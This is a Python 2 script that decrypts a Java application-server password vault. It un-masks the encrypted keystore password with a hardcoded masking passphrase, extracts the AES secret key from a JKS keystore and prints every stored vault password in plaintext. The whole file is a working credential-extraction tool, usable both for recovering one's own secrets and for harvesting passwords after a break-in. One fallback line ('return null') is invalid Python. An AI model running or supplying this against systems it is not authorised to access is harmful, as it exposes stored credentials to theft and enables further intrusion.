import hashlib
import javaobj
import jks
import string
import sys
from Crypto.Cipher import AES, DES

def clean(s):
 return filter(lambda x: x in string.printable, s).strip()

def get_derived_key(password, salt, count):
 key = password + salt
 for i in range(count):
  m = hashlib.md5(key)
  key = m.digest()
 return (key[:8], key[8:])

def customb64decode(msg):
 alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz./_'
 result = ''
 for i in range(0, len(msg), 4):
  p0 = alphabet.index(msg[i])
  p1 = alphabet.index(msg[i + 1])
  p2 = alphabet.index(msg[i + 2])
  p3 = alphabet.index(msg[i + 3])
  if p0 != 64:
   result += chr(((p1 & 0x30) >> 4) | (p0 << 2))
  if p1 != 64:
   result += chr(((p2 & 0x3c) >> 2) | ((p1 & 0xf) << 4))
  result += chr(((p2 & 3) << 6) | p3)
 return result

def decrypt_keystore_password(enc_keystore_password, password, salt, iteration_count):
 num = 4 - (len(enc_keystore_password) % 4)
 if num != 4:
  enc_keystore_password = ('_' * num) + enc_keystore_password
 enc_text = customb64decode(enc_keystore_password)
 (dk, iv) = get_derived_key(password, salt, iteration_count)
 crypter = DES.new(dk, DES.MODE_CBC, iv)
 text = crypter.decrypt(enc_text)
 return clean(text)

def get_secret_key(keystore_filename, alias, keystore_password):
 ks = jks.KeyStore.load(keystore_filename, keystore_password)
 for a, sk in ks.secret_keys.items():
  if a == alias:
   return sk.key
 return null

def decrypt_vault_passwords(vault_filename, secret_key):
 decryption_suite = AES.new(secret_key, AES.MODE_ECB)
 print '[+] Vault passwords ='
 jobj = open(vault_filename).read()
 pobj = javaobj.loads(jobj)
 for i in range(0, len(pobj.annotations[1].annotations), 2):
  key = pobj.annotations[1].annotations[i]
  value = pobj.annotations[1].annotations[i + 1]
  if key:
   data = ''.join([chr(i % 256) for i in value])
   plain_text = decryption_suite.decrypt(data)
   print '\t -', key, '=', clean(plain_text)


passwd = "somearbitrarycrazystringthatdoesnotmatter"
KEYSTORE_PASSWORD = sys.argv[1]
KEYSTORE_ALIAS = sys.argv[2]
SALT = sys.argv[3]
ITERATION_COUNT = int(sys.argv[4])
keystore_filename = sys.argv[5]
vault_filename = sys.argv[6]

keystore_password = decrypt_keystore_password(KEYSTORE_PASSWORD, passwd, SALT, ITERATION_COUNT)
print '[+] Keystore password = ' + keystore_password

secret_key = get_secret_key(keystore_filename, KEYSTORE_ALIAS, keystore_password)
print '[+] Secretkey password = ' + secret_key.encode('hex')

decrypt_vault_passwords(vault_filename, secret_key)
